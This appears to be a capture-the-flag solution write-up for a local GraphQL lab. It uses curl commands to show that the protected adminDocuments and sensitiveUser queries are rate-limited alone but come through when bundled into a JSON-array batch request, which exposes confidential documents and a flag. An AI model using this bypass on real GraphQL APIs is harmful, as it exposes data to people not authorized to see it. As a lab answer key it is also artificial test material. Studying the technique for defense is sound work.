# Solution: Batch Query Authorization Bypass

## Overview

This challenge demonstrates how GraphQL rate limiting and access controls can be bypassed through batch query requests. Endpoints that are blocked for individual queries become accessible when included in batch requests.

## Step 1: Reconnaissance

Test normal queries:

```bash
curl -X POST http://localhost:8006/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { id username } }"
  }'
```

This works normally.

## Step 2: Vulnerability Identification

Try accessing the protected `adminDocuments` endpoint:

```bash
curl -X POST http://localhost:8006/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { adminDocuments { id title debugInfo } }"
  }'
```

This returns: "Rate limit reached for adminDocuments endpoint."

Similarly, `sensitiveUser` is also blocked:

```bash
curl -X POST http://localhost:8006/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { sensitiveUser(id: 3) { id username documents { debugInfo } } }"
  }'
```

Returns: "Rate limit reached for sensitiveUser endpoint."

## Step 3: Exploitation

The application has a flaw: it treats batch requests differently from individual requests. Batch requests require at least 2 queries, and protected endpoints are accessible within batch requests.

**Batch query to bypass rate limiting:**

```bash
curl -X POST http://localhost:8006/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ users { id username } }"},
    {"query": "{ adminDocuments { id title confidential debugInfo } }"}
  ]'
```

Note the request body is a JSON array `[...]` containing multiple query objects.

Alternative using `sensitiveUser`:

```bash
curl -X POST http://localhost:8006/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ users { id } }"},
    {"query": "{ sensitiveUser(id: 3) { id username documents { id title confidential debugInfo } } }"}
  ]'
```

## Step 4: Flag Retrieval

The batch query response returns an array of results. The second result contains the protected data with the flag in the `debugInfo` field of the confidential document.

Both `adminDocuments` and `sensitiveUser` can be used - look for documents with `confidential: true` and check their `debugInfo` field.

The flag follows the format: `HC{...}`
